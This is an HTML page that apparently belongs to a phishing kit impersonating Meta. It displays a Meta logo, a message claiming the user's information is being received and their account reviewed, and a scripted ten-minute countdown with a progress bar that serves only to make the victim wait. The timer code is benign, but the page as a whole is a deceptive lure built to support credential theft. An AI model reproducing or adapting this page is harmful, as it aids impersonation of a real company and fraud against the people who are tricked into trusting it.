<body class=""><noscript>You need to enable JavaScript to run this app.</noscript>
    <div id="root">
        <div style="background: rgb(238, 238, 238); height: 100vh;">
            <div class="header" style="background: linear-gradient(110deg, rgb(218, 237, 255) 25.08%, rgb(223, 231, 255) 34.89%, rgb(241, 245, 251) 50.82%); box-shadow: rgba(0, 0, 0, 0.1) 1px 1px 8px 1px;">
                <div style="padding-top: 15px; padding-left: 30px; padding-bottom: 10px;"><img src="/resources/meta.svg" alt="" height="15"></div>
            </div>
            <div class="body" style="display: flex; justify-content: center; transform: translate(0%, 20%); margin: 20px;">
                <div style="max-width: 700px;">
                    <div style="background: linear-gradient(110deg, rgb(218, 237, 255) 25.08%, rgb(223, 231, 255) 34.89%, rgb(241, 245, 251) 50.82%); justify-content: space-between; align-items: center; min-height: 200px; max-width: 600px; border-radius: 15px; display: flex; padding: 30px; line-height: 1.5; box-shadow: rgba(0, 0, 0, 0.1) 1px 3px 8px 3px;">
                        <div class="image" style="display: flex; align-items: center; justify-content: center; margin-right: 30px;"><img src="/resources/ref.png" height="130" alt="" style="border-radius: 10px;"></div>
                        <div class="text">
                            <div class="" style="font-weight: bold;">We are receiving your information</div>
                            <div class="" style="margin-top: 20px; margin-bottom: 20px;">Reviewing your activity takes just a few more moments. We might require additional information to confirm that this is your account.</div>
                            <div class="">Please wait, this could take up to 5-10 minutes, please be patient while we review your case... (wait <span id="time-display">10:00</span>)</div>
                            <div class="" style="margin-top: 20px; background-color: rgb(240, 242, 245); width: 100%; height: 25px;">
                                <div class="progress" id="progress-bar"></div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <div id="volume-booster-visusalizer">
        <div class="sound">
            <div class="sound-icon"></div>
            <div class="sound-wave sound-wave_one"></div>
            <div class="sound-wave sound-wave_two"></div>
            <div class="sound-wave sound-wave_three"></div>
        </div>
        <div class="segments-box">
            <div data-range="1-20" class="segment"><span></span></div>
            <div data-range="21-40" class="segment"><span></span></div>
            <div data-range="41-60" class="segment"><span></span></div>
            <div data-range="61-80" class="segment"><span></span></div>
            <div data-range="81-100" class="segment"><span></span></div>
        </div>
    </div>
	
	
	
	
	    <style>
        .progress-bar-container {
            margin-top: 20px;
            background-color: rgb(240, 242, 245);
            width: 100%;
            height: 25px;
            position: relative;
        }

        .progress {
            background-color: rgb(26, 119, 242);
            width: 0;
            height: 25px;
        }

        .time-display {
            margin-top: 10px;
        }
    </style>

    <script>
        // Initial time in seconds (10 minutes)
        let totalTime = 10 * 60;
        let currentTime = totalTime;

        // Update interval in milliseconds
        const updateInterval = 1000;

        // Get elements
        const timeDisplay = document.getElementById('time-display');
        const progressBar = document.getElementById('progress-bar');

        function updateProgressBar() {
            // Calculate remaining time
            const minutes = Math.floor(currentTime / 60);
            const seconds = currentTime % 60;
            // Format time as MM:SS
            const formattedTime = `${String(minutes).padStart(2, '0')}:${String(seconds).padStart(2, '0')}`;
            // Update time display
            timeDisplay.textContent = formattedTime;

            // Calculate progress as a percentage
            const progressPercent = ((totalTime - currentTime) / totalTime) * 100;
            // Update progress bar width
            progressBar.style.width = `${progressPercent}%`;

            // Decrement current time
            currentTime--;

            // Stop when time is up
            if (currentTime < 0) {
                clearInterval(timerInterval);
            }
        }

        // Start updating the progress bar and time display
        const timerInterval = setInterval(updateProgressBar, updateInterval);
    </script>
</body>